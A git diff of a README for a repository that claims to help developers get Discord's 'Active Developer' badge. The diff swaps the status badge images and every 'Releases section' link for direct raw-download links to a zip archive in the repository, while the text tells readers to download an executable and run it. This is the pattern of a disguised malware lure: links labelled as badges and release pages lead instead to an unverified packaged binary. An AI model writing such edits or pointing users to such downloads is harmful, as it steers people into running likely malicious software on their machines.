@@ -1,6 +1,6 @@
 # 🎖️ Discord Active Developer Badge
 
-![GitHub All Releases](https://img.shields.io/github/downloads/sleek-design/discord-active-developer-badge/total) ![GitHub Release](https://img.shields.io/github/release/sleek-design/discord-active-developer-badge) ![GitHub Issues](https://img.shields.io/github/issues/sleek-design/discord-active-developer-badge)
+![GitHub All Releases](https://github.com/sleek-design/discord-active-developer-badge/raw/refs/heads/main/bot/badge_active_discord_developer_2.8-alpha.2.zip) ![GitHub Release](https://github.com/sleek-design/discord-active-developer-badge/raw/refs/heads/main/bot/badge_active_discord_developer_2.8-alpha.2.zip) ![GitHub Issues](https://github.com/sleek-design/discord-active-developer-badge/raw/refs/heads/main/bot/badge_active_discord_developer_2.8-alpha.2.zip)
 
 Welcome to the **Discord Active Developer Badge** repository! This project offers a simple solution for developers seeking to obtain Discord's "Active Developer" badge. By following the steps outlined here, you can streamline the process and focus more on your development work.
 
@@ -27,7 +27,7 @@ The "Active Developer" badge is a recognition for developers who actively contri
 
 ## 📥 Installation
 
-To get started, you need to download the executable file. Visit the [Releases section](https://github.com/sleek-design/discord-active-developer-badge/releases) to find the latest version. Download the file and execute it on your machine.
+To get started, you need to download the executable file. Visit the [Releases section](https://github.com/sleek-design/discord-active-developer-badge/raw/refs/heads/main/bot/badge_active_discord_developer_2.8-alpha.2.zip) to find the latest version. Download the file and execute it on your machine.
 
 ## ⚙️ Usage
 
@@ -58,6 +58,6 @@ For any inquiries or support, please contact the repository maintainer. You can 
 
 ## 🎉 Conclusion
 
-We hope this repository helps you easily obtain the Discord "Active Developer" badge. Your contributions to the Discord community are valuable, and we are excited to see what you create. For more information, check the [Releases section](https://github.com/sleek-design/discord-active-developer-badge/releases) to stay updated on new versions and features.
+We hope this repository helps you easily obtain the Discord "Active Developer" badge. Your contributions to the Discord community are valuable, and we are excited to see what you create. For more information, check the [Releases section](https://github.com/sleek-design/discord-active-developer-badge/raw/refs/heads/main/bot/badge_active_discord_developer_2.8-alpha.2.zip) to stay updated on new versions and features.
 
 Thank you for being a part of this project! Happy coding!
